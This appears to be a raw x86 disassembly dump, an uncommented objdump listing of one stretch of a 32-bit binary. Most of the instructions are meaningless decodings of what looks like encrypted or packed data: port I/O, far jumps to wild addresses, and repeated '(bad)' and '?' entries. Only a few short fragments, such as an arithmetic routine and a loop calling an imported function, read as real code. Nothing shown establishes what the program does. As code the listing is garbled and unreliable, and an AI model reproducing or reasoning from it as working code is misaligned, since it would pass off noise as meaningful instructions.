  4060fc:	cdq    
  4060fd:	or     eax,DWORD PTR [ebp+0x69]
  406100:	jb     0x40613f
  406102:	ret    
  406103:	call   0xc1e3:0x94184abb
  40610a:	scas   al,BYTE PTR es:[edi]
  40610b:	imul   ebx
  40610d:	dec    ebp
  40610e:	fcmovne st,st(0)
  406110:	inc    ebx
  406111:	in     al,dx
  406112:	scas   eax,DWORD PTR es:[edi]
  406113:	mov    edx,0x7e1f3b
  406118:	add    eax,0x1096d967
  40611d:	mov    edx,0x69efb46a
  406122:	sbb    eax,0xe724e1d3
  406127:	mov    ds:0x760b6216,eax
  40612c:	in     al,dx
  40612d:	leave  
  40612e:	jo     0x4060ee
  406130:	xor    bh,BYTE PTR [ebp+edx*4-0x75304075]
  406137:	hlt    
  406138:	dec    esi
  406139:	stos   BYTE PTR es:[edi],al
  40613a:	mov    DWORD PTR [ecx],esi
  40613c:	sub    al,0xe1
  40613e:	mov    ch,0x66
  406140:	into   
  406141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406142:	jmp    0x4060ec
  406144:	icebp  
  406145:	sti    
  406146:	add    al,0xd6
  406148:	or     al,0x79
  40614a:	xor    ecx,ebp
  40614c:	and    al,0xcb
  40614e:	scas   eax,DWORD PTR es:[edi]
  40614f:	mov    ch,BYTE PTR [edi-0x31a95e76]
  406155:	jae    0x4060f3
  406157:	lock or DWORD PTR [eax-0x67775448],esi
  40615e:	xor    eax,eax
  406160:	mov    BYTE PTR [edi-0x55f686cc],cl
  406166:	rol    DWORD PTR [ebx],cl
  406168:	lock scas eax,DWORD PTR es:[edi]
  40616a:	inc    eax
  40616b:	pop    edi
  40616c:	push   esi
  40616d:	push   ss
  40616e:	adc    al,0x98
  406170:	vpshab xmm7,xmm6,xmm1
  406175:	xchg   BYTE PTR [edx-0x4d],cl
  406178:	fstp   TBYTE PTR [ebp+0x796f3d1d]
  40617e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40617f:	mov    bl,BYTE PTR [edi]
  406181:	xchg   esp,eax
  406182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406183:	arpl   WORD PTR [edx-0x62755b6c],bp
  406189:	sar    BYTE PTR [ebp-0x3a],cl
  40618c:	retfw  0x46c2
  406190:	aad    0x59
  406192:	call   0xddbceb97
  406197:	mov    esp,0xc883f87a
  40619c:	inc    esp
  40619d:	dec    esp
  40619e:	retf   
  40619f:	arpl   dx,si
  4061a1:	xchg   ebx,eax
  4061a2:	(bad)  
  4061a3:	int    0x41
  4061a5:	pop    es
  4061a6:	mov    eax,ds:0x5dbf2e3a
  4061ab:	mov    DWORD PTR [ecx],0xafc37161
  4061b1:	mov    ebx,DWORD PTR [esi+0x69]
  4061b4:	cmp    BYTE PTR [ecx-0x64],0x44
  4061b8:	jle    0x406235
  4061ba:	stos   DWORD PTR es:[edi],eax
  4061bb:	dec    esi
  4061bc:	stos   DWORD PTR es:[edi],eax
  4061bd:	rcl    BYTE PTR [esi+0x54],0xd9
  4061c1:	test   DWORD PTR [esi+0x6d3dacca],ecx
  4061c7:	imul   ebx,DWORD PTR [eax-0x786a8e0],0xffffffb0
  4061ce:	xchg   edi,eax
  4061cf:	pop    ebx
  4061d0:	pusha  
  4061d1:	or     dh,al
  4061d3:	jnp    0x4061a8
  4061d5:	xchg   ebx,eax
  4061d6:	sti    
  4061d7:	mov    ebx,DWORD PTR [edi+0x7e661607]
  4061dd:	pushf  
  4061de:	nop
  4061df:	in     al,dx
  4061e0:	pushf  
  4061e1:	jmp    0x5cda:0xed4ef5e1
  4061e8:	cld    
  4061e9:	cmp    eax,0xdf5d6489
  4061ee:	sub    BYTE PTR [ecx],bh
  4061f0:	mov    bh,0xe8
  4061f2:	sub    cl,BYTE PTR [edi+0x5bebf305]
  4061f8:	cmp    BYTE PTR [eax+0x4f44b237],cl
  4061fe:	out    0x2,al
  406200:	jo     0x4061a4
  406202:	xor    al,0x31
  406204:	pop    edx
  406205:	shl    DWORD PTR [ebp-0xd],1
  406208:	pop    ebp
  406209:	jmp    0x40622d
  40620b:	in     eax,0x58
  40620d:	jecxz  0x406248
  40620f:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  406211:	mov    WORD PTR [edi],fs
  406213:	popf   
  406214:	int3   
  406215:	data16 add dl,0x7d
  406219:	jnp    0x406278
  40621b:	adc    ebx,eax
  40621d:	xor    DWORD PTR [edi+0x3168dbe1],0xc6f0bfbf
  406227:	ins    BYTE PTR es:[edi],dx
  406228:	adc    eax,0xc5edaa25
  40622d:	xchg   esi,eax
  40622e:	ret    
  40622f:	mov    edi,0xd78b056a
  406234:	push   ds
  406235:	cld    
  406236:	pop    ss
  406237:	jbe    0x406255
  406239:	push   es
  40623a:	aad    0x11
  40623c:	adc    ah,ah
  40623e:	pop    ss
  40623f:	ret    
  406240:	enter  0x4abb,0x5b
  406244:	fisubr DWORD PTR [ebp-0x74]
  406247:	test   eax,0x4dd82946
  40624c:	icebp  
  40624d:	scas   al,BYTE PTR es:[edi]
  40624e:	sti    
  40624f:	xchg   esi,eax
  406250:	lods   eax,DWORD PTR ds:[esi]
  406251:	js     0x4062a6
  406253:	(bad)  [eax]
  406255:	add    ebp,DWORD PTR [esi+0x20]
  406258:	in     al,0xd8
  40625a:	je     0x406275
  40625c:	scas   al,BYTE PTR es:[edi]
  40625d:	pop    esp
  40625e:	inc    ebp
  40625f:	and    cl,BYTE PTR [edi+0x66ad0fd9]
  406265:	mov    ebp,DWORD PTR [esi-0x2e]
  406268:	out    dx,al
  406269:	(bad)  
  40626a:	aad    0x3b
  40626c:	dec    ebx
  40626d:	imul   DWORD PTR [esi]
  40626f:	push   ds
  406270:	cmp    eax,ebp
  406272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406273:	sbb    ebp,ecx
  406275:	test   BYTE PTR [esi+ebp*1-0x24],0xa2
  40627a:	xchg   ecx,eax
  40627b:	stc    
  40627c:	cmp    DWORD PTR [ecx],ebp
  40627e:	push   es
  40627f:	test   BYTE PTR ds:[ebp+0x67],ah
  406283:	jae    0x40629e
  406285:	inc    ebx
  406286:	xor    edi,esp
  406288:	jmp    0x3c0f4284
  40628d:	leave  
  40628e:	mov    dl,0xe0
  406290:	inc    ebp
  406291:	hlt    
  406292:	mov    ds:0x46471b70,al
  406297:	cdq    
  406298:	loopne 0x406225
  40629a:	jne    0x406294
  40629c:	xor    eax,edx
  40629e:	xor    esi,edx
  4062a0:	add    eax,ecx
  4062a2:	add    esi,ecx
  4062a4:	imul   eax,esi
  4062a7:	mov    esi,DWORD PTR [ebp+0xc]
  4062aa:	cmp    esi,eax
  4062ac:	mov    eax,DWORD PTR [ebp-0x4]
  4062af:	je     0x405ea6
  4062b5:	xor    eax,edx
  4062b7:	add    eax,ecx
  4062b9:	mov    ecx,DWORD PTR [ebp+0xc]
  4062bc:	imul   eax,ecx
  4062bf:	add    eax,DWORD PTR [ebp+0x8]
  4062c2:	mov    DWORD PTR [ebp+0xc],eax
  4062c5:	mov    eax,DWORD PTR [ebp+0xc]
  4062c8:	pop    esi
  4062c9:	leave  
  4062ca:	ret    0x8
  4062cd:	push   ebp
  4062ce:	mov    ebp,esp
  4062d0:	push   ecx
  4062d1:	mov    DWORD PTR ds:0x43359f,0x7109
  4062db:	jmp    0x406534
  4062e0:	(bad)  
  4062e1:	fwait
  4062e2:	dec    edi
  4062e3:	ds jge 0x4062d0
  4062e6:	push   ecx
  4062e7:	mov    ds:0xe05cf94c,eax
  4062ec:	jmp    0x40630e
  4062ee:	div    BYTE PTR [esp+esi*1+0x3b]
  4062f2:	jl     0x406370
  4062f4:	xor    BYTE PTR [esi+0x7c],bh
  4062f7:	jl     0x4062b3
  4062f9:	dec    edx
  4062fa:	mov    dl,0x15
  4062fc:	cmc    
  4062fd:	inc    ebp
  4062fe:	jg     0x4062c8
  406300:	sti    
  406301:	sub    al,0xea
  406303:	push   esi
  406304:	xchg   esi,eax
  406305:	inc    esp
  406306:	push   eax
  406307:	jo     0x4062b0
  406309:	push   ebp
  40630a:	data16 and al,0xd5
  40630d:	and    bh,BYTE PTR [edi-0x61]
  406310:	outs   dx,DWORD PTR ds:[esi]
  406311:	lea    esp,[ebx-0x11a915ff]
  406317:	xor    esp,ebp
  406319:	pop    ebx
  40631a:	scas   al,BYTE PTR es:[edi]
  40631b:	sub    al,0x7a
  40631d:	xor    al,0x8c
  40631f:	xchg   ebx,eax
  406320:	mov    ah,0xf1
  406322:	add    cl,BYTE PTR [esi+0x7963045e]
  406328:	jle    0x4062b2
  40632a:	fistp  DWORD PTR [eax+0x5f]
  40632d:	ficom  WORD PTR [ecx+edx*8]
  406330:	pmulhuw mm4,mm4
  406333:	add    edx,DWORD PTR [eax]
  406335:	dec    ecx
  406336:	not    BYTE PTR [edi+0x22f73b6]
  40633c:	xor    eax,0xd183177f
  406341:	test   al,0xf9
  406343:	loopne 0x406316
  406345:	sub    bh,BYTE PTR [ebx-0x3d]
  406348:	jnp    0x4063b7
  40634a:	or     ah,BYTE PTR [ebx]
  40634c:	in     al,0x10
  40634e:	in     al,dx
  40634f:	test   al,0x9
  406351:	jns    0x40638b
  406353:	outs   dx,BYTE PTR ds:[esi]
  406354:	int3   
  406355:	les    esi,FWORD PTR [edx*2-0x5abbbf49]
  40635c:	lods   eax,DWORD PTR ds:[esi]
  40635d:	rcl    BYTE PTR [ecx],1
  40635f:	test   DWORD PTR [ecx+0x7b06d678],edi
  406365:	pop    edx
  406366:	(bad)  
  406367:	pop    es
  406368:	dec    edi
  406369:	mov    edi,0xa45cc96c
  40636e:	mov    edx,DWORD PTR [esi-0x3603f4f0]
  406374:	jmp    0x4abc8e00
  406379:	idiv   BYTE PTR [eax-0x11]
  40637c:	cmc    
  40637d:	push   edi
  40637e:	ror    BYTE PTR [eax-0x3a],0x96
  406382:	pop    esp
  406383:	popa   
  406384:	mov    edx,0xe8e63661
  406389:	sahf   
  40638a:	mov    esi,0x6184bb66
  40638f:	or     edx,DWORD PTR [ebx]
  406391:	loop   0x406380
  406393:	jp     0x4063d8
  406395:	les    edx,FWORD PTR [esi+eax*8-0x73]
  406399:	push   0xf1a0cfd3
  40639e:	dec    esp
  40639f:	scas   al,BYTE PTR es:[edi]
  4063a0:	sbb    edx,edi
  4063a2:	jmp    0xfdde:0x3b73b651
  4063a9:	repz inc esp
  4063ab:	push   eax
  4063ac:	aam    0x19
  4063ae:	and    BYTE PTR [edi+0x1],0xf8
  4063b2:	repnz push ebp
  4063b4:	rol    BYTE PTR [ebx+edx*1-0x73],1
  4063b8:	aas    
  4063b9:	cmp    DWORD PTR [ebp-0x1],ebx
  4063bc:	sbb    dh,BYTE PTR [edx]
  4063be:	ss jp  0x40643b
  4063c1:	push   0xffffff99
  4063c3:	fs (bad) 
  4063c5:	fwait
  4063c6:	pushf  
  4063c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063c8:	cmp    eax,0x2a73e931
  4063cd:	mov    WORD PTR [edi],?
  4063cf:	mov    DWORD PTR ds:0xd22ee528,esi
  4063d5:	ss in  eax,0x47
  4063d8:	push   0x2870d2ae
  4063dd:	loop   0x406441
  4063df:	cmp    al,0x80
  4063e1:	lods   al,BYTE PTR ds:[esi]
  4063e2:	push   edi
  4063e3:	popa   
  4063e4:	outs   dx,DWORD PTR ds:[esi]
  4063e5:	sbb    eax,0x8c96c0e2
  4063ea:	or     al,0xb8
  4063ec:	xchg   ecx,eax
  4063ed:	xchg   ah,dl
  4063ef:	(bad)  
  4063f0:	or     al,BYTE PTR [ecx-0x72]
  4063f3:	fs mov ebp,0xb8ad9b81
  4063f9:	loope  0x406439
  4063fb:	sub    al,0x8f
  4063fd:	out    dx,al
  4063fe:	xchg   esp,esp
  406400:	mov    ebp,0x591f6a4
  406405:	jmp    0x4063fb
  406407:	push   ecx
  406408:	push   ebp
  406409:	test   eax,0xde33c06d
  40640e:	xor    DWORD PTR [ebx],ecx
  406410:	jg     0x40641a
  406412:	mov    ch,0xaa
  406414:	jl     0x4063b7
  406416:	pop    edx
  406417:	fisttp WORD PTR [esi]
  406419:	xchg   ecx,eax
  40641a:	cs pop eax
  40641c:	mov    dh,0xb
  40641e:	dec    eax
  40641f:	jecxz  0x4063a4
  406421:	ins    BYTE PTR es:[edi],dx
  406422:	add    esi,DWORD PTR [edx+0x3b]
  406425:	adc    ch,BYTE PTR [ecx]
  406427:	push   es
  406428:	sbb    DWORD PTR [edi+eax*1+0x6b],esp
  40642c:	pop    es
  40642d:	adc    eax,0x8d6acb18
  406432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406433:	ds sub eax,0x29b7cea6
  406439:	lock iret 
  40643b:	add    BYTE PTR [edx],cl
  40643d:	int    0x76
  40643f:	shr    DWORD PTR [eax-0x71],cl
  406442:	mov    cl,0x76
  406444:	dec    edi
  406445:	mov    eax,0xde142062
  40644a:	imul   DWORD PTR [ecx+eax*4-0x22ef42b]
  406451:	dec    eax
  406452:	add    DWORD PTR [ebx+0x11124bb3],edx
  406458:	pop    ebx
  406459:	and    ecx,DWORD PTR [ebp+ebx*2+0x5e]
  40645d:	shr    DWORD PTR [edx],cl
  40645f:	(bad)
  406463:	jecxz  0x406485
  406465:	aam    0x3f
  406467:	mov    ah,0xbf
  406469:	stc    
  40646a:	mov    ah,0x78
  40646c:	les    ebx,FWORD PTR [ebx]
  40646e:	add    BYTE PTR [ebx],bh
  406470:	cmp    eax,0xcc57e461
  406475:	lahf   
  406476:	popf   
  406477:	ret    0x885a
  40647a:	mul    ecx
  40647c:	xchg   DWORD PTR [eax],edx
  40647e:	dec    eax
  40647f:	pop    ss
  406480:	jbe    0x406421
  406482:	jmp    0x94b9:0xd25d4bd5
  406489:	mov    edx,0xb734c99e
  40648e:	lahf   
  40648f:	dec    esi
  406490:	mov    esi,0x13f279ed
  406495:	iret   
  406496:	pop    ds
  406497:	ins    BYTE PTR es:[edi],dx
  406498:	in     eax,0xa6
  40649a:	dec    ecx
  40649b:	xchg   ebp,eax
  40649c:	fist   WORD PTR [edi+0x8]
  40649f:	fbld   TBYTE PTR [ecx-0x4207095e]
  4064a5:	js     0x40647a
  4064a7:	cwde   
  4064a8:	retf   0x2312
  4064ab:	pop    esi
  4064ac:	xchg   ecx,eax
  4064ad:	daa    
  4064ae:	inc    DWORD PTR [esi-0x5747dbcd]
  4064b4:	xchg   esp,eax
  4064b5:	mov    esi,esp
  4064b7:	clc    
  4064b8:	dec    eax
  4064b9:	pop    edx
  4064ba:	cwde   
  4064bb:	(bad)  
  4064bc:	loopne 0x406473
  4064be:	adc    ah,BYTE PTR [esi+ebx*8-0x73]
  4064c2:	fst    QWORD PTR [ebx+ebx*2]
  4064c5:	jno    0x4064c3
  4064c7:	test   DWORD PTR [edx],ebp
  4064c9:	int3   
  4064ca:	fdiv   st(3),st
  4064cc:	leave  
  4064cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064ce:	out    0x52,eax
  4064d0:	out    0x4c,eax
  4064d2:	data16 (bad) 
  4064d4:	imul   edi,DWORD PTR [esi],0x3f
  4064d7:	inc    ebx
  4064d8:	cmovns edi,DWORD PTR [ebp-0x1a]
  4064dc:	sub    al,0x7f
  4064de:	hlt    
  4064df:	stos   DWORD PTR es:[edi],eax
  4064e0:	adc    DWORD PTR [ebx+0x62cb7e47],eax
  4064e6:	push   ebp
  4064e7:	ret    
  4064e8:	cmp    al,0x2e
  4064ea:	xor    BYTE PTR [ebp+0xe],0x76
  4064ee:	mov    bl,0x6
  4064f0:	jnp    0x406553
  4064f2:	hlt    
  4064f3:	test   eax,0xefaf0f19
  4064f8:	pop    eax
  4064f9:	and    eax,0xe87a2c2a
  4064fe:	xchg   esp,eax
  4064ff:	adc    al,0x55
  406501:	fxch   st(1)
  406503:	(bad)  
  406505:	push   cs
  406506:	jae    0x406527
  406508:	or     al,BYTE PTR [edx]
  40650a:	push   edi
  40650b:	aam    0x6c
  40650d:	test   al,0xea
  40650f:	in     al,dx
  406510:	loopne 0x40654b
  406512:	out    dx,al
  406513:	xchg   esi,eax
  406514:	ins    BYTE PTR es:[edi],dx
  406515:	xor    bl,ah
  406517:	retf   0x146c
  40651a:	xchg   DWORD PTR [ecx+0x2a],edi
  40651d:	xchg   ecx,eax
  40651e:	mov    BYTE PTR [esi+0x3f],ah
  406521:	loop   0x4064c4
  406523:	fidivr WORD PTR [eax]
  406525:	xchg   esi,eax
  406526:	mov    ds:0x7070b7fb,eax
  40652b:	bound  eax,QWORD PTR [edx-0x312e1d52]
  406531:	(bad)  
  406532:	clc    
  406533:	mov    eax,0x4881b851
  406538:	add    BYTE PTR [eax],al
  40653a:	mov    eax,0x5a3fc9e
  40653f:	mov    DWORD PTR [ebp-0x4],eax
  406542:	mov    ecx,DWORD PTR [ebp-0x4]
  406545:	mov    DWORD PTR ds:0x4335a7,0x6d12
  40654f:	mov    DWORD PTR [ebp-0x8],0x4ec5
  406556:	mov    DWORD PTR ds:0x43365f,0x756c
  406560:	cmp    ecx,eax
  406562:	mov    DWORD PTR ds:0x43355b,0x510c
  40656c:	jne    0x406d16
  406572:	mov    ax,WORD PTR [ebp-0x8]
  406576:	and    DWORD PTR ds:0x4335df,0x0
  406580:	mov    ecx,DWORD PTR ds:0x4335df
  406586:	inc    ecx
  406587:	mov    DWORD PTR ds:0x4335df,ecx
  40658d:	cmp    DWORD PTR ds:0x4335df,0x9
  406594:	jne    0x4065a5
  40659a:	push   0x3195
  40659f:	call   DWORD PTR ds:0x4120c0
  4065a5:	cmp    DWORD PTR ds:0x4335df,0x8
  4065ac:	jne    0x4065bf
  4065b2:	mov    ecx,DWORD PTR ds:0x4335df
  4065b8:	inc    ecx
  4065b9:	mov    DWORD PTR ds:0x4335df,ecx
  4065bf:	cmp    DWORD PTR ds:0x4335df,0x11
  4065c6:	jb     0x406580
  4065cc:	jmp    0x406825
  4065d1:	fld    st(1)
  4065d3:	addr16 into 
  4065d5:	outs   dx,BYTE PTR ds:[si]
  4065d7:	jno    0x4065ca
  4065d9:	add    eax,0xa995211a
  4065de:	jae    0x406620
  4065e0:	jb     0x4065ca
  4065e2:	lds    edi,FWORD PTR [esp+edi*2+0x30]
  4065e6:	jle    0x406664
  4065e8:	jl     0x4065ac
  4065ea:	and    al,bh
  4065ec:	push   es
  4065ed:	std    
  4065ee:	mov    eax,ds:0x148fb39b
  4065f3:	call   0x8cf4ca5c
  4065f8:	or     BYTE PTR [ecx-0x2471d5f1],bh
  4065fe:	pop    esp
  4065ff:	xor    eax,0x177ee430
  406604:	inc    eax
  406605:	sbb    al,0x87
  406607:	in     al,0xe1
  406609:	jle    0x4065fb
  40660b:	(bad)  
  40660c:	mov    esp,0x4d683790
  406611:	cmp    eax,0xbc44a7d
  406616:	dec    esi
  406617:	mov    ?,WORD PTR [eax]
  406619:	xchg   ebx,eax
  40661a:	xchg   bh,dh
  40661c:	mov    ah,0x29
  40661e:	xchg   esp,eax
  40661f:	add    eax,0xe1f659c0
  406624:	clc    
  406625:	shl    BYTE PTR [edx-0x2b],0x8f
  406629:	inc    ebp
  40662a:	ins    BYTE PTR es:[edi],dx
  40662b:	pop    eax
  40662c:	std    
  40662d:	mov    bh,0xdd
  40662f:	jge    0x40668b
  406631:	fdivp  st(4),st
  406633:	ret    
  406634:	les    ecx,FWORD PTR [ebp-0x1173dfa1]
  40663a:	test   ch,bl
  40663c:	arpl   WORD PTR [esi-0x6c6cbc3],cx
  406642:	mov    al,0x60
  406644:	je     0x40660e
  406646:	sub    esi,DWORD PTR [ecx+0x14926d7c]
  40664c:	cmp    ebx,esp
  40664e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40664f:	cwde   
  406650:	xchg   ebx,eax
  406651:	mov    bl,ah
  406653:	or     dl,al
  406655:	and    esi,DWORD PTR [edi]
  406657:	pushf  
  406658:	call   0x52f51f1f
  40665d:	jbe    0x40660d
  40665f:	jno    0x4066ad
  406661:	inc    edi
  406662:	jp     0x406617
  406664:	cmp    edi,DWORD PTR [ebp-0x1356af5b]
  40666a:	mov    ?,WORD PTR [esp+ebx*4+0x41]
  40666e:	mov    eax,DWORD PTR [ecx+edx*8]
  406671:	js     0x40669f
  406673:	sbb    BYTE PTR [esi],bl
  406675:	mov    BYTE PTR [ecx+0x53b3d1b5],dh
  40667b:	xchg   esp,eax
  40667c:	push   ebx
  40667d:	lods   eax,DWORD PTR ds:[esi]
  40667e:	mov    BYTE PTR [ecx],ch
  406680:	xor    eax,0x41dcda34
  406685:	shl    DWORD PTR [edx+0x494410e0],1
  40668b:	arpl   cx,di
  40668d:	fld    DWORD PTR [edx]
  40668f:	mov    ecx,0xe0f4e90b
  406694:	loop   0x40664a
  406696:	popf   
  406697:	icebp  
  406698:	adc    eax,0x97f33b01
  40669d:	lock sub BYTE PTR [edx+0x3b],bh
  4066a1:	xchg   esi,eax
  4066a2:	ret    
  4066a3:	fidiv  WORD PTR [ebp+ebp*1+0x732f7ac7]
  4066aa:	mov    esp,0xa389679
  4066af:	dec    edx
  4066b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066b1:	cmp    DWORD PTR [ebp+ecx*2+0x6d],ebp
  4066b5:	push   ss
  4066b6:	cmp    BYTE PTR [ecx],ch
  4066b8:	sbb    al,0xf7
  4066ba:	das    
  4066bb:	test   DWORD PTR [edx+0xf7cbde1],esi
  4066c1:	icebp  
  4066c2:	test   DWORD PTR [edi],eax
  4066c4:	mov    bh,BYTE PTR [edx-0x21]
  4066c7:	dec    ecx
  4066c8:	leave  
  4066c9:	jo     0x406697
  4066cb:	push   cs
  4066cc:	sub    edi,edx
  4066ce:	inc    eax
  4066cf:	push   ebp
  4066d0:	mov    dl,0x14
  4066d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066d3:	mov    ebx,0x5cd383cc
  4066d8:	jne    0x406660
  4066da:	fistp  WORD PTR [ebp+eiz*8+0x787c3660]
  4066e1:	(bad)  
  4066e2:	scas   al,BYTE PTR es:[edi]
  4066e3:	jne    0x4066ff
  4066e5:	mov    ecx,DWORD PTR [ebp-0x59b00827]
  4066eb:	or     al,0x9d
  4066ed:	push   esp
  4066ee:	call   0x6186:0x57d7e723
  4066f5:	jle    0x4066eb
  4066f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066f8:	mov    eax,0x3f410a40
  4066fd:	das    
  4066fe:	rcr    BYTE PTR [esi+0x7],1
  406701:	pop    edx
  406702:	xchg   DWORD PTR [edx+0x1c],ebx
  406705:	push   eax
  406706:	pop    ss
  406707:	jo     0x406751
  406709:	aaa    
  40670a:	add    eax,0x93322f54
  40670f:	ja     0x4066f1
  406711:	sahf   
  406712:	push   ebx
  406713:	cmp    eax,0x6acc4a3c
  406718:	sub    al,0x35
  40671a:	jno    0x4066e2
  40671c:	adc    ebx,DWORD PTR [ecx+0x34062833]
  406722:	daa    
  406723:	pop    edi
  406724:	ficom  WORD PTR [ebp-0x465ce8c3]
  40672a:	sub    al,0xc5
  40672c:	inc    eax
  40672d:	fimul  DWORD PTR [ecx+0x1f]
  406730:	ficomp DWORD PTR [ecx]
  406732:	fadd   DWORD PTR [esi]
  406734:	popf   
  406735:	ins    BYTE PTR es:[edi],dx
  406736:	inc    esp
  406737:	and    al,bh
  406739:	mov    edx,0xf3ddd5eb
  40673e:	or     ecx,ebp
  406740:	xchg   ecx,eax
  406741:	xchg   ebp,ebp
  406743:	icebp  
  406744:	scas   al,BYTE PTR es:[edi]
  406745:	ds cmp esp,0x593d6257
  40674c:	adc    al,0x87
  40674e:	enter  0x5649,0x54
  406752:	stos   BYTE PTR es:[edi],al
  406753:	out    dx,al
  406754:	cmp    BYTE PTR [eax+0x7],ah
  406757:	xor    edx,DWORD PTR [ebp-0x5d]
  40675a:	cs sbb al,0xf
  40675d:	xlat   BYTE PTR ds:[ebx]
  40675e:	shl    DWORD PTR [edx],cl
  406760:	pop    edx
  406761:	pop    ebx
  406762:	(bad)  
  406764:	add    BYTE PTR [esi],0xb8
  406767:	in     eax,0xed
  406769:	push   ebp
  40676a:	in     al,0xaa
  40676c:	retf   
  40676d:	adc    esp,DWORD PTR [ebp-0x80]
  406770:	mov    bh,0xba
  406772:	mov    ds:0x7deac562,eax
  406777:	add    al,0x46
  406779:	push   edi
  40677a:	(bad)  
  40677b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40677c:	jge    0x406721
  40677e:	nop
  40677f:	xor    ch,BYTE PTR [ecx]
  406781:	adc    BYTE PTR [edx+edx*8+0x3502db97],dh
  406788:	add    eax,edx
  40678a:	cli    
  40678b:	mov    ch,0xac
  40678d:	iret   
  40678e:	adc    DWORD PTR [edi-0x1b],0xffffffef
  406792:	mov    al,0xe8
  406794:	jmp    0x4b8a:0x2bddee3c
  40679b:	push   edx
  40679c:	adc    BYTE PTR [eax-0x63],bl
  40679f:	xor    dh,dl
  4067a1:	sbb    edx,DWORD PTR [eax-0x61]
  4067a4:	bound  ecx,QWORD PTR [eax-0x5a51ca1a]
  4067aa:	popf   
  4067ab:	add    BYTE PTR [edi-0x3eed467d],al
  4067b1:	push   ebx
  4067b2:	cmp    BYTE PTR [ebp+0x393947e6],bh
  4067b8:	sahf   
  4067b9:	inc    eax
  4067ba:	ins    DWORD PTR es:[edi],dx
  4067bb:	mov    dh,BYTE PTR [edi+0x4aa5a721]
  4067c1:	mov    al,0x72
  4067c3:	mov    BYTE PTR [eax-0x441a8b7a],ch
  4067c9:	mov    ds:0xfe59e58c,eax
  4067ce:	in     eax,0x38
  4067d0:	cmp    esp,esi
  4067d2:	mov    BYTE PTR [edx+ecx*4-0x1c22e539],al
  4067d9:	xor    DWORD PTR [edi+edi*8-0x4a64c7b8],edx
  4067e0:	cmp    DWORD PTR [ebx],esp
  4067e2:	mov    bh,0x77
  4067e4:	dec    eax
  4067e5:	ja     0x406799
  4067e7:	test   eax,0xdcc1c192
  4067ec:	(bad)  
  4067ed:	retf   
  4067ee:	addr16 pop ebp
  4067f0:	pusha  
  4067f1:	xchg   ebp,eax
  4067f2:	les    ebp,FWORD PTR [eax+0x3a5a1907]
  4067f8:	faddp  st(0),st
  4067fa:	xor    eax,0x2d8cd4d
  4067ff:	mov    edx,DWORD PTR [edi*1+0x5dbeb050]
  406806:	cmp    al,0x89
  406808:	or     eax,0xf6f59543
  40680d:	adc    BYTE PTR [edx-0x42],bh
  406810:	inc    edi
  406811:	int    0x5
  406813:	sbb    ebp,edx
  406815:	mov    al,ds:0x8c48bc6f
  40681a:	xchg   BYTE PTR [edi+0x46],dl
  40681d:	fcomp  DWORD PTR [ecx+0x67d3941a]
  406823:	lock gs mov ecx,0x8a3a
  40682a:	jmp    0x406a83
  40682f:	or     ah,cl
  406831:	mov    ah,0x1f
  406833:	jo     0x40689c
  406835:	xchg   ebx,eax
  406836:	jmp    0x406845
  406838:	push   ss
  406839:	test   eax,0x73680cb
  40683e:	call   0x7cbd2fef
  406843:	xor    BYTE PTR [esi+0x7c],bh
  406846:	jl     0x40689d
  406848:	xor    DWORD PTR [edi-0xb],esi
  40684b:	push   ecx
  40684c:	adc    ah,cl
  40684e:	jl     0x40687c
  406850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406851:	ret    
  406852:	mov    dh,0xa6
  406854:	in     eax,0x37
  406856:	jecxz  0x40688c
  406858:	xchg   ecx,eax
  406859:	dec    eax
  40685a:	outs   dx,BYTE PTR ds:[esi]
  40685b:	sub    al,0xd7
  40685d:	in     eax,dx
  40685e:	mov    dh,0x4
  406860:	imul   ebx,DWORD PTR [edi-0x1b9d6e44],0x4dc0579
  40686a:	or     eax,0x9e52933b
  40686f:	call   FWORD PTR [esi-0x5f]
  406872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406873:	mov    ebx,0x763910ce
  406878:	daa    
  406879:	jmp    0xb3d4:0xcfb0757e
  406880:	lods   al,BYTE PTR ds:[esi]
  406881:	ret    0x93d6
  406884:	jo     0x4068b7
  406886:	add    DWORD PTR [edi+0xeb55b0],ebp
  40688c:	dec    edi
  40688d:	int    0x10
  40688f:	xchg   esp,eax
  406890:	(bad)  
  406891:	mov    bh,0xe9
  406893:	mov    ah,0x82
  406895:	ror    DWORD PTR [ebx-0x7dfbecce],1
  40689b:	mov    al,0x24
  40689d:	cmp    BYTE PTR [esi],dl
  40689f:	lods   eax,DWORD PTR ds:[esi]
  4068a0:	popf   
  4068a1:	out    0x57,eax
  4068a3:	loope  0x4068e0
  4068a5:	in     al,0xfe
  4068a7:	push   ebx
  4068a8:	push   cs
  4068a9:	int3   
  4068aa:	js     0x406916
  4068ac:	and    ecx,DWORD PTR fs:[edi+0x79]
  4068b0:	pop    eax
  4068b1:	cdq    
  4068b2:	mov    ah,0x3f
  4068b4:	jg     0x40689d
  4068b6:	mov    bh,0xd5
  4068b8:	in     al,dx
  4068b9:	jmp    0x4068e9
  4068bb:	xor    eax,0x6743749d
  4068c0:	fcomp  DWORD PTR [ebx-0x11]
  4068c3:	add    eax,0xb34e6c5c
  4068c8:	adc    al,0x13
  4068ca:	out    dx,eax
  4068cb:	(bad)  
  4068cc:	mov    ebx,0x2625e005
  4068d1:	mov    gs,WORD PTR [eax+0x51]
  4068d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068d5:	xor    esp,DWORD PTR [eax+0x49]
  4068d8:	retf   0x562e
  4068db:	sti    
  4068dc:	mov    bl,0x15
  4068de:	and    al,0xf0
  4068e0:	(bad)
  4068e3:	pop    edx
  4068e4:	push   esp
  4068e5:	stos   BYTE PTR es:[edi],al
  4068e6:	icebp  
  4068e7:	std    
  4068e8:	leave  
